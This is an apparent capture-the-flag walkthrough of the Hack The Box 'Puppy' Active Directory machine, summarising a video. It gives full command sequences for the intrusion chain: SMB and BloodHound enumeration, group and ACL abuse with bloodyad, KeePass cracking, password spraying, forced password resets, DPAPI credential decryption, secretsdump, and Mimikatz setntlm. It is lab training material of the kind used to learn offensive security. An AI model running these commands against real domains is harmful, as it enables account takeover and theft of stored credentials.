## Initial Reconnaissance & Enumeration

The initial phase involves network scanning and gathering basic Active Directory information.

### Nmap Scan & Host File Update

1.  **Nmap Scan:** The presenter begins with a detailed Nmap scan to identify open ports and services.

    ```bash
    nmap -sC -sV -vv -oA puppy 10.10.11.70
    ```

      * `-sC`: Performs a script scan using default scripts.
      * `-sV`: Probes open ports to determine service/version information.
      * `-vv`: Increases verbosity.
      * `-oA puppy`: Outputs results in all major formats (XML, Grepable, Nmap) with the base name `puppy`.
      * `10.10.11.70`: The IP address of the target machine.

    The scan reveals 14 open ports, including **DNS (53)**, **SMB (445)**, **Kerberos**, and **LDAP**. It identifies the domain as `puppy.htb` and the hostname as `DC`. An **NFS server (111)** running on Windows is also noted as unusual. A clock skew is observed, which is important for Kerberos operations.

2.  **Update Hosts File:** Add the domain and hostname to your `/etc/hosts` file for proper resolution.

    ```bash
    sudo vi /etc/hosts
    # Add:
    10.10.11.70 puppy.htb DC DC.puppy.htb
    ```

3.  **Check NFS Exports (Initial Attempt):** An attempt is made to list NFS exports, but it hangs.

    ```bash
    showmount -e 10.10.11.70
    ```

      * `showmount -e`: Displays the server's NFS export list.

    Using Wireshark, the presenter observes that the client attempts to connect to port 111, receives a rejection, and then attempts to connect to destination port 0, indicating a configuration issue or block on the server side.

-----

## Initial Access via Assumed Breach & File Share Discovery

The box starts with a given set of credentials, which are used to enumerate accessible shares and BloodHound data.

### Provided Credentials

The initial credentials are for user **`levi.james`** with password **`KingOfSpades7!`**.

1.  **Store Credentials:**

    ```bash
    echo "levi.james:KingOfSpades7!" > creds.txt
    ```

2.  **Test SMB Authentication:**

    ```bash
    netexec smb 10.10.11.70 -u levi.james -p 'KingOfSpades7!'
    ```

    This confirms successful authentication.

3.  **Enumerate SMB Shares:**

    ```bash
    netexec smb 10.10.11.70 -u levi.james -p 'KingOfSpades7!' --shares
    ```

    This reveals a `DEV` share (for `puppy.devs`) to which `levi.james` does not currently have access, but it's noted for later.

### BloodHound Data Collection & Analysis

BloodHound helps visualize potential attack paths within Active Directory.

1.  **Collect BloodHound Data with RustHound:**

    ```bash
    RustHound -d puppy.htb -u levi.james -p 'KingOfSpades7!' --dc 10.10.11.70
    ```

      * `RustHound`: A tool to collect Active Directory data, including more comprehensive information than the Python collector, especially useful for certificate data.

2.  **Start BloodHound:**

    ```bash
    cd /opt/bloodhound-server
    docker-compose up -d
    ```

3.  **Ingest Data:** Access BloodHound at `http://localhost:8088`, log in, and upload the `.json` files generated by RustHound.

4.  **Analyze `levi.james` in BloodHound:**
    Searching for `levi.james` in BloodHound reveals they are a member of the **`HR`** group. The `HR` group has **`GenericWrite`** privileges over the **`Developers`** group. This is a critical finding for privilege escalation.

-----

## Privilege Escalation to `developers` Group & KeyPass Database

Leveraging the `GenericWrite` privilege, `levi.james` adds themselves to the `Developers` group, gaining access to the `DEV` share.

### Add `levi.james` to `Developers` Group

Use `bloodyad` to modify group membership.

```bash
bloodyad add-group-member --group-dn "CN=Developers,CN=Users,DC=puppy,DC=htb" \
--user-dn levi.james -u levi.james -p 'KingOfSpades7!' --host puppy.htb --domain puppy.htb
```

  * `--group-dn`: Distinguished Name of the target group.
  * `--user-dn`: Distinguished Name of the user to add.

### Access `DEV` Share & Retrieve KeyPass Database

Now that `levi.james` is in the `Developers` group, the `DEV` share is accessible.

1.  **Access `DEV` Share:**

    ```bash
    smbclient //10.10.11.70/DEV -U levi.james%'KingOfSpades7!'
    ```

2.  **Download KeyPass Database:**
    Inside `smbclient`:

    ```
    dir
    get recovery.kdbx
    exit
    ```

### Crack KeyPass Database

The `recovery.kdbx` file needs to be cracked to reveal stored credentials.

1.  **Convert KeyPass to John format:**
    The video uses a custom `keypass2john.py` script (potentially an updated version from GitHub) to handle KeyPass v4 databases.

    ```bash
    python3 keypass2john.py recovery.kdbx > puppy.keypass
    ```

2.  **Crack with John the Ripper:**
    Hashcat does not support this specific KeyPass v4 format, so John the Ripper is used.

    ```bash
    /opt/john/run/john --wordlist=/usr/share/wordlists/rockyou.txt puppy.keypass
    ```

    This cracks the KeyPass master password: **`Liverpool`**.

3.  **Open KeyPass Database:** Use the KeyPass GUI to open `recovery.kdbx` with the password `Liverpool`. This reveals credentials for **`ant.edwards`** (password: **`Ant-Man2025`**) and other users.

-----

## Further Privilege Escalation & Administrator Access

The discovered `ant.edwards` credentials are used to gain control over `adam.silver` and ultimately access the server.

### Password Spraying & `ant.edwards` Access

1.  **Get User List:** Extract a list of usernames from BloodHound data (e.g., from `users.json`).

    ```bash
    jq -r '.data[] | .Properties.sAMAccountName' <bloodhound_data.json> > users.txt
    ```

2.  **Password Spray (for confirmation of `ant.edwards`):**

    ```bash
    netexec smb 10.10.11.70 -U users.txt -P passwords.txt --continue-on-success
    ```

      * `passwords.txt`: A file containing discovered passwords (including `Ant-Man2025`).

    This confirms `ant.edwards` can authenticate.

3.  **Analyze `ant.edwards` in BloodHound:**
    `ant.edwards` is a member of `Senior Developers`, which has `GenericAll` over **`adam.silver`**. This allows `ant.edwards` to change `adam.silver`'s password.

### Take Over `adam.silver`'s Account

1.  **Change `adam.silver`'s Password:**

    ```bash
    bloodyad set-password --identity adam.silver -u ant.edwards -p 'Ant-Man2025' --new-password 'PleaseSubscribe!' --host puppy.htb --domain puppy.htb
    ```

2.  **Test `adam.silver`'s Account:**

    ```bash
    netexec smb 10.10.11.70 -u adam.silver -p 'PleaseSubscribe!'
    ```

    This reveals the account is **disabled**.

3.  **Re-enable `adam.silver`'s Account:**

    ```bash
    bloodyad remove-uac-flag --identity adam.silver -u ant.edwards -p 'Ant-Man2025' --flag ACCOUNTDISABLE --host puppy.htb --domain puppy.htb
    ```

4.  **Gain WinRM Access as `adam.silver`:**

    ```bash
    evil-winrm -i 10.10.11.70 -u adam.silver -p 'PleaseSubscribe!'
    ```

    This provides an interactive PowerShell session on the server as `adam.silver`.

-----

## Post-Compromise & Domain Admin Access

From `adam.silver`'s session, further enumeration leads to a backup file containing domain admin credentials.

### Backup File Discovery

1.  **Browse File System:**

    ```powershell
    dir C:\
    ```

    Identify a `Backups` directory.

2.  **Explore Backups:**

    ```powershell
    cd C:\Backups
    dir
    ```

    A file named `site-backup.zip` is found.

3.  **Download & Unzip Backup:**

    ```powershell
    download site-backup.zip
    # On attacker machine:
    unzip site-backup.zip -d backup_dir/
    ```

    Inside the backup, `NMS_Oconfig.xml` is found.

4.  **Extract Credentials from `NMS_Oconfig.xml`:**
    Examine the XML file. It contains credentials for **`steph.cooper`** with password **`ChefSteph2025`**.

### Domain Admin Access via DPAPI

`steph.cooper` is a high-privileged user. Windows DPAPI (Data Protection API) is used to protect sensitive credentials stored on the system.

1.  **Test `steph.cooper` Credentials:**

    ```bash
    netexec smb 10.10.11.70 -u steph.cooper -p 'ChefSteph2025'
    evil-winrm -i 10.10.11.70 -u steph.cooper -p 'ChefSteph2025'
    ```

    This grants an `evil-winrm` session as `steph.cooper`.

2.  **Enumerate DPAPI Master Key and Credential Files (using WinPEAS/manual check):**
    The video uses WinPEAS to enumerate. Manually, these files are usually located in the user's profile under `AppData\Roaming\Microsoft\Protect\` or `AppData\Local\Microsoft\Credentials\`. Identify:

      * **DPAPI Master Key:** (e.g., in `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\<SID>\`)
      * **Credential Files (DPAPI Blobs):** (e.g., in `C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\<GUID>`)

    **Example locations (paths may vary):**

      * Master Key: `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-...\<GUID>`
      * Credential Files: `C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\`
        `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\`

3.  **Download DPAPI Files:**
    Copy the identified master key file and credential files to an accessible location (e.g., `C:\ProgramData`) on the target machine, remove their hidden attribute (`attrib -h`), and then download them using `evil-winrm download`.

    ```powershell
    # Example for master key
    copy C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-...\<GUID> C:\ProgramData\masterkey
    attrib -h C:\ProgramData\masterkey
    download C:\ProgramData\masterkey

    # Example for credential file 1
    copy C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\<GUID1> C:\ProgramData\cred1
    attrib -h C:\ProgramData\cred1
    download C:\ProgramData\cred1

    # Example for credential file 2
    copy C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\<GUID2> C:\ProgramData\cred2
    attrib -h C:\ProgramData\cred2
    download C:\ProgramData\cred2
    ```

4.  **Decrypt DPAPI Blobs with Impacket's `dpapi.py`:**
    On your attacking machine, use Impacket's `dpapi.py` script to decrypt the master key using `steph.cooper`'s password, and then use the decrypted master key to decrypt the credential blobs.

      * **Decrypt Master Key:**

        ```bash
        impacket-dpapi -masterkey <masterkey_file> -sid <steph.cooper_SID> -password 'ChefSteph2025'
        ```

          * `<steph.cooper_SID>`: Retrieve `steph.cooper`'s SID (e.g., `whoami /all` in `evil-winrm`).
            This command will output the **decrypted master key**.

      * **Decrypt Credential Blobs:**

        ```bash
        impacket-dpapi -credential <cred1_file> -key <decrypted_master_key>
        impacket-dpapi -credential <cred2_file> -key <decrypted_master_key>
        ```

        One of these decrypted blobs will reveal credentials for **`steph.cooper.adm`** (password: **`fivethchiponitsway2025`**).

5.  **Access Domain Admin Account:**
    The `steph.cooper.adm` account is a **Domain Admin**.

    ```bash
    evil-winrm -i 10.10.11.70 -u steph.cooper.adm -p 'fivethchiponitsway2025'
    ```

    This provides a shell as the Domain Admin.

6.  **Retrieve Root Flag:**

    ```powershell
    cd C:\Users\Administrator\Desktop
    type root.txt
    ```

### Beyond Root (Password History & Mimikatz)

The video also touches upon resetting passwords and the use of Mimikatz.

  * **Password History:** When `ant.edwards` changed `adam.silver`'s password, an enterprise would typically enforce a password history policy. Using `secretsdump.py` with the `--history` flag, you can dump password history hashes, allowing an attacker to revert a password to a previous one if necessary for operational security.
    ```bash
    secretsdump.py -u steph.cooper.adm -p 'fivethchiponitsway2025' puppy.htb --history
    ```
  * **Mimikatz for NTLM Hash Setting:** The video demonstrates using **Mimikatz** to set a user's NTLM hash directly, bypassing password policy checks.
    1.  **Upload Mimikatz:** Upload `mimikatz.exe` to the target (e.g., `C:\ProgramData`).
    2.  **Execute Mimikatz:**
        ```powershell
        C:\ProgramData\mimikatz.exe
        # Inside Mimikatz:
        privilege::debug
        lsadump::setntlm /user:adam.silver /ntlm:<desired_ntlm_hash>
        ```
        This allows setting `adam.silver`'s password to a specific NTLM hash (e.g., for `PleaseSubscribe!`), even if the account is disabled.
